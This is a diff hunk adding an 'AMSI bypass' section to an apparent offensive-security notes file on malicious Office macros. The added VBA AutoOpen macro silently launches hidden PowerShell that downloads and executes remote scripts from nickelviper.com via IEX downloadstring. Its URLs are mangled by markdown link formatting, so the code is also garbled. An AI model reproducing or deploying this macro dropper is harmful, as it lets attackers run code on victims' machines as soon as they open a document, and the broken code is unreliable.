@@ -85,6 +85,12 @@ Sub AutoOpen()
 End Sub
 ```
 
+AMSI bypass:
+``` vba
+	Sub AutoOpen() Dim Shell As Object Set Shell = CreateObject("wscript.shell") 'AMSI bypass and payload Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('[http://nickelviper.com/a1'));IEX](http://nickelviper.com/a1'));IEX "http://nickelviper.com/a1'));IEX") ((new-object net.webclient).downloadstring('[http://nickelviper.com/a2')](http://nickelviper.com/a2') "http://nickelviper.com/a2')"))"""  
+End Sub
+```
+
 ## Remote Template Injection
 
 ---
